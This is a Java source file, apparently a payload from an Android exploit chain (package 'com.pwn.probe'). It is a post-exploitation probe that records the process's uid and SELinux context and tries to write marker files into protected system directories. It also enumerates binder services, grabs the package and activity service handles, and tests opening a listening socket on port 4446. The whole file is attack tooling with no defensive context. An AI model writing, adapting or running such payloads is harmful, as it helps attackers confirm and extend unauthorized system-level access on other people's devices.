package com.pwn.probe;

import java.io.*;

public class Shell {
    static String readFile(String p) {
        try {
            FileInputStream f = new FileInputStream(p);
            byte[] b = new byte[256];
            int n = f.read(b);
            f.close();
            if (n <= 0) return "";
            return new String(b, 0, n).trim();
        } catch (Throwable t) { return "ERR:" + t.toString(); }
    }

    static boolean tryWrite(String p, String data) {
        try {
            FileOutputStream f = new FileOutputStream(p);
            f.write(data.getBytes());
            f.close();
            return true;
        } catch (Throwable t) { return false; }
    }

    public static void main(String[] args) {
        StringBuilder sb = new StringBuilder();
        sb.append("uid=").append(android.os.Process.myUid());
        sb.append(" pid=").append(android.os.Process.myPid());
        sb.append(" ctx=").append(readFile("/proc/self/attr/current"));
        sb.append(" | /data/local/tmp=").append(tryWrite("/data/local/tmp/pwn_ss.txt", "system_server domain uid0\n"));
        sb.append(" /data/system=").append(tryWrite("/data/system/pwn_ss.txt", "x"));
        sb.append(" /sdcard=").append(tryWrite("/sdcard/pwn_ss.txt", "system_server domain uid0\n"));
        sb.append(" /data/dalvik-cache=").append(tryWrite("/data/dalvik-cache/pwn_ss.txt", "x"));
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            String[] svcs = (String[]) sm.getMethod("listServices").invoke(null);
            sb.append(" | services=").append(svcs == null ? -1 : svcs.length);
            Object pm = sm.getMethod("getService", String.class).invoke(null, "package");
            sb.append(" pkgbinder=").append(pm != null);
            Object am = sm.getMethod("getService", String.class).invoke(null, "activity");
            sb.append(" actbinder=").append(am != null);
        } catch (Throwable t) { sb.append(" | binder ERR ").append(t); }
        try {
            java.net.ServerSocket ss = new java.net.ServerSocket(4446);
            sb.append(" | socketbind=OK");
            ss.close();
        } catch (Throwable t) { sb.append(" | socketbind ERR ").append(t); }
        android.util.Log.i("PWNSS", sb.toString());
    }
}

